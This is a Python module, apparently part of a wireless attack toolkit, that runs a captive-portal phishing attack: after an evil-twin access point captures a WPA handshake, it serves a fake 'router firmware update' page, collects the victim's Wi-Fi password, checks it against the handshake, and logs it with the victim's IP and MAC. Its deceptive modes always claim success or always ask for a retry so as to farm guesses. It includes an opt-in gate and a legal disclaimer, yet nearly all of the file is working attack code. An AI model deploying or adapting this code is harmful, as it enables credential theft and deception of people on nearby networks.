"""Captive-portal credential phishing (S12.5).

The counter to "modern clients won't hand over a handshake": instead of
cracking, ask the victim for the PSK. After Evil WPA captures M1+M2, the
bait-switch flips the rogue from WPA2 to an *open* clone of the same
SSID; the victim's device rejoins password-free, the captive sentinel
(portal mode) forces the OS captive browser to pop, and a fake "router
firmware update — re-enter your Wi-Fi password" page collects the PSK.
The submitted password is **verified instantly against the captured
handshake** (``app/tools/wpa_crypto``) — no wordlist, no GPU.

This service owns:

* **Config** (``$DATA_DIR/captive_portal.json``) — the global opt-in
  (default OFF, enabled only behind the ``phishing`` ethics gate in
  Settings → Security) and the verify-behaviour mode.
* **Armed handshake** — the ``.22000`` line + SSID the bait-switch set,
  against which submitted PSKs are checked. In-memory (clears on
  platform restart, which is correct — a stale handshake shouldn't
  outlive the session).
* **Harvested credentials** (``$DATA_DIR/captive_creds.json``) — every
  submitted password with its verify result, for the UI + audit.
* **The landing page** — a built-in firmware-update template, or the
  operator's custom HTML at ``$DATA_DIR/captive_template.html``.

Verify-behaviour modes (operator picks in Settings; default A):

* **A** (default) — single attempt, always show "Update successful!"
  regardless of whether the password was right. Most realistic: the
  victim types once and walks away believing it worked.
* **B** — multi-try honest: wrong password → "incorrect, try again";
  correct → success. Useful when you want the victim to keep trying
  until they get it right (and you confirm it).
* **C** — multi-try deceptive: always "try again", never reveal
  success — farms multiple guesses. The operator sees the verified
  hit in the UI even though the victim is never told.

Default OFF, opt-in, lab-use-only. Targeting devices you don't own or
have written authorisation to test is illegal in most jurisdictions.
"""

from __future__ import annotations

import json
import logging
import threading
import time
from html import escape
from pathlib import Path
from typing import Any

log = logging.getLogger(__name__)

VERIFY_MODES = ("A", "B", "C")
_MAX_CREDS = 500

# Built-in landing page. Deliberately generic ("Router") rather than
# impersonating a real brand. ``{ssid}`` and ``{msg}`` are substituted.
_BUILTIN_TEMPLATE = """<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Router Firmware Update</title>
<style>
  body {{ font-family: -apple-system, Segoe UI, Roboto, sans-serif;
         background:#f2f4f7; margin:0; color:#1a1a1a; }}
  .card {{ max-width:380px; margin:8vh auto; background:#fff; border-radius:10px;
          box-shadow:0 2px 14px rgba(0,0,0,.1); padding:28px 26px; }}
  h1 {{ font-size:19px; margin:0 0 6px; }}
  p {{ font-size:14px; line-height:1.5; color:#444; }}
  .net {{ font-weight:600; }}
  input[type=password] {{ width:100%; box-sizing:border-box; padding:11px 12px;
          font-size:15px; border:1px solid #c9ced6; border-radius:7px; margin-top:6px; }}
  button {{ width:100%; margin-top:16px; padding:12px; font-size:15px; font-weight:600;
           color:#fff; background:#2563eb; border:0; border-radius:7px; }}
  .err {{ color:#b42318; font-size:13px; margin-top:10px; }}
  .foot {{ font-size:11px; color:#8a8f98; margin-top:18px; text-align:center; }}
</style></head>
<body>
  <div class="card">
    <h1>Firmware update required</h1>
    <p>A security update is being applied to your router. To finish
       installing it, please re-enter the Wi-Fi password for
       <span class="net">{ssid}</span> to re-establish the secure
       connection.</p>
    <form method="POST" action="/portal/submit">
      <label for="psk">Wi-Fi password</label>
      <input type="password" id="psk" name="psk" autocomplete="off"
             autofocus required minlength="8" maxlength="63">
      {msg}
      <button type="submit">Apply update</button>
    </form>
    <div class="foot">Do not turn off your router during the update.</div>
  </div>
</body></html>"""

_SUCCESS_PAGE = """<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Update complete</title>
<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f2f4f7;
  color:#1a1a1a;text-align:center;padding-top:14vh}
  .ok{font-size:46px}h1{font-size:20px}p{color:#444;font-size:14px}</style>
</head><body><div class="ok">✓</div>
<h1>Update successful!</h1>
<p>Your router firmware is up to date. You can close this page.</p>
</body></html>"""


class CaptivePortalService:
    def __init__(self, data_dir: Path) -> None:
        self._data_dir = data_dir
        self._config_path = data_dir / "captive_portal.json"
        self._creds_path = data_dir / "captive_creds.json"
        self._custom_template_path = data_dir / "captive_template.html"
        self._lock = threading.Lock()
        self._config: dict[str, Any] | None = None
        self._creds: list[dict[str, Any]] = self._load_creds()
        # Armed handshake (in-memory only). Set by the bait-switch.
        self._armed_line: str | None = None
        self._armed_ssid: str | None = None
        self._portal_active = False

    # ---------- Config ----------
    def _load_config(self) -> dict[str, Any]:
        if self._config is None:
            try:
                loaded = json.loads(self._config_path.read_text())
            except (FileNotFoundError, json.JSONDecodeError):
                loaded = {}
            self._config = {
                "enabled": bool(loaded.get("enabled", False)),
                "verify_mode": loaded.get("verify_mode")
                if loaded.get("verify_mode") in VERIFY_MODES else "A",
            }
        return self._config

    def _save_config(self) -> None:
        self._config_path.parent.mkdir(parents=True, exist_ok=True)
        tmp = self._config_path.with_suffix(".tmp")
        tmp.write_text(json.dumps(self._config, indent=2))
        tmp.replace(self._config_path)

    def get_config(self) -> dict[str, Any]:
        with self._lock:
            return dict(self._load_config())

    def is_enabled(self) -> bool:
        with self._lock:
            return bool(self._load_config()["enabled"])

    def set_enabled(self, enabled: bool, *, confirm_phrase: str | None = None
                    ) -> tuple[bool, str]:
        """Enabling requires the operator to type ``phishing`` (stronger
        gate than the rogue-AP ``pineap`` confirm). Disabling is always
        allowed and also tears down any active portal."""
        enabled = bool(enabled)
        if enabled and (confirm_phrase or "").strip().lower() != "phishing":
            return False, "type 'phishing' to confirm enabling credential capture"
        with self._lock:
            self._load_config()
            self._config["enabled"] = enabled
            self._save_config()
            if not enabled:
                self._portal_active = False
                self._armed_line = None
                self._armed_ssid = None
        log.info("captive_portal: %s", "ENABLED" if enabled else "disabled")
        return True, f"credential capture {'enabled' if enabled else 'disabled'}"

    def set_verify_mode(self, mode: str) -> tuple[bool, str]:
        if mode not in VERIFY_MODES:
            return False, f"verify_mode must be one of {VERIFY_MODES}"
        with self._lock:
            self._load_config()
            self._config["verify_mode"] = mode
            self._save_config()
        return True, f"verify mode set to {mode}"

    # ---------- Arming (bait-switch sets this) ----------
    def arm(self, hash_line: str, ssid: str) -> tuple[bool, str]:
        """Point the portal at a captured handshake. Refuses unless the
        global opt-in is on."""
        with self._lock:
            if not self._load_config()["enabled"]:
                return False, "captive portal not enabled (Settings → Security)"
            self._armed_line = hash_line
            self._armed_ssid = ssid
            self._portal_active = True
        log.info("captive_portal: armed for SSID %r against captured handshake", ssid)
        return True, f"portal armed for {ssid!r}"

    def disarm(self) -> None:
        with self._lock:
            self._portal_active = False
            self._armed_line = None
            self._armed_ssid = None

    def is_portal_active(self) -> bool:
        with self._lock:
            return self._portal_active and bool(self._load_config()["enabled"])

    def armed_ssid(self) -> str | None:
        with self._lock:
            return self._armed_ssid

    # ---------- Landing page ----------
    def get_portal_html(self, ssid: str | None = None,
                        *, error: bool = False) -> str:
        """Render the landing page. Operator custom HTML at
        ``$DATA_DIR/captive_template.html`` wins if present; otherwise the
        built-in firmware-update template. ``{ssid}`` and ``{msg}`` are
        substituted in both."""
        ssid = ssid or self.armed_ssid() or "your network"
        msg_html = ('<div class="err">Incorrect password. Please try again.</div>'
                    if error else "")
        try:
            custom = self._custom_template_path.read_text()
            return custom.replace("{ssid}", escape(ssid)).replace("{msg}", msg_html)
        except (FileNotFoundError, OSError):
            return _BUILTIN_TEMPLATE.format(ssid=escape(ssid), msg=msg_html)

    def success_html(self) -> str:
        return _SUCCESS_PAGE

    # ---------- Credential submission ----------
    def submit_credential(
        self, psk: str, *, client_ip: str | None = None,
        client_mac: str | None = None,
    ) -> dict[str, Any]:
        """Verify a submitted password against the armed handshake,
        record it, and decide the response per the verify mode.

        Returns ``{verified, message, accept_more}`` where ``message`` is
        ``"success"`` or ``"retry"`` and ``accept_more`` tells the
        handler whether to re-show the form."""
        with self._lock:
            line = self._armed_line
            ssid = self._armed_ssid
            mode = self._load_config()["verify_mode"]
            active = self._portal_active and self._config["enabled"]

        verified: bool | None = None
        if active and line:
            try:
                from app.tools.wpa_crypto import verify_psk_against_line
                verified = verify_psk_against_line(psk, line)
            except Exception:
                log.exception("captive_portal: verify failed")
                verified = None

        record = {
            "ts": time.time(),
            "client_ip": client_ip,
            "client_mac": client_mac,
            "ssid": ssid,
            "psk": psk,
            "verified": verified,
        }
        self._record(record)
        log.info("captive_portal: credential from %s — verified=%s",
                 client_mac or client_ip or "?", verified)
        self._emit(record)

        # Response decision per mode.
        if mode == "A":
            return {"verified": verified, "message": "success", "accept_more": False}
        if mode == "B":
            if verified:
                return {"verified": True, "message": "success", "accept_more": False}
            return {"verified": verified, "message": "retry", "accept_more": True}
        # mode C — deceptive multi-try: never reveal success
        return {"verified": verified, "message": "retry", "accept_more": True}

    # ---------- Credentials store ----------
    def _load_creds(self) -> list[dict[str, Any]]:
        try:
            data = json.loads(self._creds_path.read_text())
            return list(data.get("credentials") or [])
        except (FileNotFoundError, json.JSONDecodeError):
            return []

    def _record(self, rec: dict[str, Any]) -> None:
        with self._lock:
            self._creds.append(rec)
            if len(self._creds) > _MAX_CREDS:
                self._creds = self._creds[-_MAX_CREDS:]
            try:
                self._creds_path.parent.mkdir(parents=True, exist_ok=True)
                tmp = self._creds_path.with_suffix(".tmp")
                tmp.write_text(json.dumps({"credentials": self._creds}, indent=2))
                tmp.replace(self._creds_path)
            except OSError:
                log.exception("captive_portal: persist creds failed")

    def list_credentials(self, *, limit: int = 200) -> list[dict[str, Any]]:
        with self._lock:
            return list(reversed(self._creds[-limit:]))

    def clear_credentials(self) -> tuple[bool, str, int]:
        with self._lock:
            n = len(self._creds)
            self._creds = []
            try:
                if self._creds_path.is_file():
                    self._creds_path.unlink()
            except OSError:
                log.exception("captive_portal: clear creds failed")
        return True, f"cleared {n} credential record(s)", n

    def get_stats(self) -> dict[str, Any]:
        with self._lock:
            cfg = self._load_config()
            verified = sum(1 for c in self._creds if c.get("verified"))
            return {
                "enabled": cfg["enabled"],
                "verify_mode": cfg["verify_mode"],
                "portal_active": self._portal_active and cfg["enabled"],
                "armed_ssid": self._armed_ssid,
                "has_custom_template": self._custom_template_path.is_file(),
                "attempts": len(self._creds),
                "verified_count": verified,
            }

    def _emit(self, rec: dict[str, Any]) -> None:
        try:
            from app import socketio
            socketio.emit("captive:credential", rec, namespace="/")
        except Exception:
            pass


# ---------- Module singleton ----------

_service: "CaptivePortalService | None" = None


def get_service() -> CaptivePortalService:
    global _service
    if _service is None:
        from flask import current_app
        _service = CaptivePortalService(current_app.config["DATA_DIR"])
    return _service
